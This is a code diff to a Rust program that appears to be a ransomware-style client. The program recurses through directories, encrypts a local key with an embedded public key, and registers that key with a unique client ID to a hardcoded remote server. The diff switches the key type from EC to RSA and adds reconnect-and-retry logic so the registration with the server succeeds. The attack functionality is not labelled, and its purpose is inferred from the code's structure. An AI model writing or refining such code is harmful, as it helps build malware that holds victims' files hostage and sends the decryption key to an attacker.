@@ -1,6 +1,6 @@
 use comms::{generate_ucid, Message};
 use filesystem::recurse_directory_with_channel;
-use openssl::ec;
+use openssl::rsa;
 use std::path::PathBuf;
 use std::thread::sleep;
 use std::time::Duration;
@@ -46,8 +46,8 @@ async fn main() {
         let _ = thread.await;
     }
 
-    let ecc_key = ec::EcKey::public_key_from_pem(PUB_KEY).unwrap();
-    let p_key = openssl::pkey::PKey::from_ec_key(ecc_key).unwrap();
+    let rsa_key = rsa::Rsa::public_key_from_pem(PUB_KEY).unwrap();
+    let p_key = openssl::pkey::PKey::from_rsa(rsa_key).unwrap();
     let encryptor = openssl::encrypt::Encrypter::new(&p_key).unwrap();
     let buffer_len = encryptor.encrypt_len(&key).unwrap();
     let mut encrypted = vec![0u8; buffer_len];
@@ -58,20 +58,21 @@ async fn main() {
     let mut ucid = generate_ucid().unwrap();
 
     key.zeroize(); // zero out key, not needed anymore
+    dbg!(comms::Message::RegisterClient((ucid, encrypted.as_slice())));
 
     let mut register_blob = comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();
 
     let addr = SERVER_IP.parse().unwrap();
 
     let socket = TcpSocket::new_v4().unwrap();
-    let stream = socket.connect(addr).await.unwrap();
+    let mut stream = socket.connect(addr).await.unwrap();
     let mut read_buff = vec![0; 1024];
 
     loop {
         if stream.writable().await.is_ok() {
             let len = stream.try_write(&register_blob);
             if len.is_err() {
-                // try immediately, connection appears to be active
+                // retry immediately, connection appears to be active
                 sleep(Duration::from_millis(1));
                 continue;
             } else if len.as_ref().is_ok_and(|x| *x == 0) {
@@ -79,6 +80,8 @@ async fn main() {
                     "Connection dropped by server. Assumed rate limit, retrying after 30 seconds."
                 );
                 sleep(Duration::from_secs(31));
+                let socket = TcpSocket::new_v4().unwrap();
+                stream = socket.connect(addr).await.unwrap();
                 continue;
             }
         }
@@ -87,7 +90,7 @@ async fn main() {
             let len = stream.try_read(&mut read_buff);
 
             if len.is_err() {
-                // try immediately, connection appears to be active
+                // retry immediately, connection appears to be active
                 sleep(Duration::from_millis(1));
                 continue;
             } else if len.as_ref().is_ok_and(|x| *x == 0) {
@@ -95,6 +98,8 @@ async fn main() {
                     "Connection dropped by server. Assumed rate limit, retrying after 30 seconds."
                 );
                 sleep(Duration::from_secs(31));
+                let socket = TcpSocket::new_v4().unwrap();
+                stream = socket.connect(addr).await.unwrap();
                 continue;
             }
 
@@ -111,6 +116,8 @@ async fn main() {
                     "Connection dropped by server. Response was rate limit, retrying after 30 seconds."
                 );
                     sleep(Duration::from_secs(31));
+                    let socket = TcpSocket::new_v4().unwrap();
+                    stream = socket.connect(addr).await.unwrap();
                     continue;
                 }
                 Message::Accepted(_) => {
